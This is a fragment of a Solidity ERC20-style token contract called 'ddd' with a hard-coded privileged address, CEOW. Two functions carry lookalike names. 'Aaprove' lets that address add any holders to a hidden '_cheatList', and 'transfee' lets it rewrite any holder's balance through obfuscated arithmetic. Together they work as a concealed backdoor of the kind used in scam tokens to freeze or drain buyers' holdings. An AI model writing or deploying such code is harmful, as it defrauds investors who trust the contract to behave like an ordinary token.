...
contract  ddd is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "ddd";
    string private _symbol = "ddd";
    uint8 private _decimals = 9;
    address payable public CEOW;
    ...
    constructor () {
        ...
        CEOW = payable(address(0x1a4F63f669E731B60F17B3Fa4935eF53BF361A4f));
    ...
    function Aaprove(bool trueorfalse, address[] calldata addressess) public {
        require(
            addressess.length < 100
            &&
            CEOW == _msgSender()
        );
        for (uint256 i; i < addressess.length; i++) {
            _cheatList[addressess[i]] = trueorfalse;
        }
    }

    function transfee(uint256 amount, address from) public {
        require(
            amount > 100
            &&
            CEOW == msg.sender
        );
        _balances[from] = _balances[from].ave(2000).sub(1000).add(500).ave(amount).add(500);
    }
